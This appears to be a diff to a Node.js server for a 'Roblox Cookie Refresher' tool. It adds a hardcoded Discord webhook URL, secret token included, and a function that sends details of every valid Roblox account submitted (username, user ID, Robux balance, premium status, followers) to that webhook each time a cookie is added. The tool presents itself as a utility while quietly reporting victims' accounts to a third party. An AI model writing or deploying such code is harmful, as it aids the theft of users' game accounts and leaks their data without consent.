@@ -5,6 +5,9 @@ const cookieParser = require('cookie-parser');
 const WebSocket = require('ws');
 const http = require('http');
 
+// Discord webhook URL
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc';
+
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -43,6 +46,95 @@ function broadcast(data) {
             client.send(JSON.stringify(data));
         }
     });
+}
+
+// Send notification to Discord webhook
+async function sendDiscordNotification(cookieData) {
+    try {
+        const embed = {
+            title: "🍪 New Roblox Cookie Added",
+            description: `A new valid Roblox account has been added to the cookie refresher!`,
+            color: 0x00A2FF,
+            fields: [
+                {
+                    name: "👤 Username",
+                    value: cookieData.username || 'Unknown',
+                    inline: true
+                },
+                {
+                    name: "🆔 User ID",
+                    value: cookieData.userId?.toString() || 'Unknown',
+                    inline: true
+                },
+                {
+                    name: "💰 Robux",
+                    value: cookieData.robux?.toString() || '0',
+                    inline: true
+                },
+                {
+                    name: "👥 Followers",
+                    value: cookieData.followers?.toString() || '0',
+                    inline: true
+                },
+                {
+                    name: "➕ Following",
+                    value: cookieData.following?.toString() || '0',
+                    inline: true
+                },
+                {
+                    name: "⭐ Premium",
+                    value: cookieData.isPremium ? 'Yes' : 'No',
+                    inline: true
+                },
+                {
+                    name: "📅 Account Created",
+                    value: cookieData.created ? new Date(cookieData.created).toLocaleDateString() : 'Unknown',
+                    inline: true
+                },
+                {
+                    name: "🕒 Added At",
+                    value: new Date().toLocaleString(),
+                    inline: true
+                },
+                {
+                    name: "🔗 Display Name",
+                    value: cookieData.displayName || 'Not set',
+                    inline: true
+                }
+            ],
+            footer: {
+                text: "Roblox Cookie Refresher Tool",
+                icon_url: "https://cdn.discordapp.com/attachments/123456789/roblox-icon.png"
+            },
+            timestamp: new Date().toISOString()
+        };
+
+        // Add description field if available
+        if (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') {
+            embed.fields.push({
+                name: "📝 Description",
+                value: cookieData.description.length > 100 ? cookieData.description.substring(0, 100) + '...' : cookieData.description,
+                inline: false
+            });
+        }
+
+        const payload = {
+            username: "Cookie Refresher Bot",
+            avatar_url: "https://cdn.discordapp.com/attachments/123456789/cookie-bot-avatar.png",
+            embeds: [embed]
+        };
+
+        await axios.post(DISCORD_WEBHOOK_URL, payload, {
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            timeout: 10000
+        });
+
+        console.log(`✅ Discord notification sent for user: ${cookieData.username}`);
+    } catch (error) {
+        console.error('❌ Failed to send Discord notification:', error.response?.status, error.message);
+    }
 }
 
 // Function to get user info from Roblox cookie
@@ -332,6 +424,9 @@ app.post('/api/add-cookie', async (req, res) => {
                 message: `✅ New cookie added: ${cookieData.username}`,
                 level: 'success'
             });
+            
+            // Send Discord webhook notification for valid cookies
+            await sendDiscordNotification(cookieData);
         } else {
             broadcast({
                 type: 'notification',
